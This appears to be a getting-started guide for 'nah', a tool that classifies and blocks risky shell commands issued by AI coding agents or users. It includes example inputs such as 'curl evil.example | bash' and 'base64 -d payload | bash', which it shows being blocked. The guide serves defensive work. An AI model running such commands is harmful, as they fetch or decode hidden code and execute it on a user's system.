# Getting Started

Get nah installed, test the classifier, then connect the runtime you want to
protect.

## Install

```bash
pip install "nah[config,keys]"
nah test "curl evil.example | bash"
```

`nah test` is a dry run. It shows what nah would do without installing hooks or
running the command.

## Choose a Runtime

| Runtime | Command | Guide |
| --- | --- | --- |
| Claude Code | `nah run claude` | [Claude Code](../runtimes/claude-code.md) |
| Codex | `nah run codex` | [Codex](../runtimes/codex.md) |
| Your shell | `nah install bash` or `nah install zsh` | [Terminal Guard](../runtimes/terminal-guard.md) |

Use `nah install claude` only when you want persistent direct Claude Code hooks.
The Claude Code plugin is available for Claude-only installs without the `nah`
CLI; see the [Claude Code guide](../runtimes/claude-code.md#plugin-only-path).

## Try the Classifier

```
$ nah test "git status"
Command:  git status
Stages:
  [1] git status → git_safe → allow → allow (git_safe → allow)
Decision:    ALLOW
Reason:      git_safe → allow

$ nah test "base64 -d payload | bash"
Command:  base64 -d payload | bash
Stages:
  [1] base64 -d payload → unknown → ask → ask (unknown → ask)
  [2] bash → unknown → ask → ask (unknown → ask)
Composition: decode | exec → BLOCK
Decision:    BLOCK
Reason:      obfuscated execution: bash receives decoded input
User message: nah blocked: this decodes hidden content and runs it.

$ nah test "git push --force"
Command:  git push --force
Stages:
  [1] git push --force → git_history_rewrite → ask → ask (git_history_rewrite → ask)
Decision:    ASK
Reason:      git_history_rewrite -> ask
User message: nah paused: this can rewrite Git history.
LLM eligible: no
```

## Configure a Rule

Policies are set by action type:

```bash
nah allow filesystem_delete
nah deny git_history_rewrite
nah status
nah forget filesystem_delete
```

Teach nah about a custom command:

```bash
nah classify "terraform destroy" filesystem_delete
nah classify "kubectl delete" container_destructive
```

Trust a host or path:

```bash
nah trust api.internal.corp.com
nah trust ~/shared-builds
```

## See It Live

For the Claude Code live demo:

```bash
git clone https://github.com/manuelschipper/nah.git
cd nah
# inside Claude Code:
/nah-demo
```

## Next Steps

- [Installation](../install.md)
- [Claude Code](../runtimes/claude-code.md)
- [Codex](../runtimes/codex.md)
- [Terminal Guard](../runtimes/terminal-guard.md)
- [Configuration overview](../configuration/index.md)
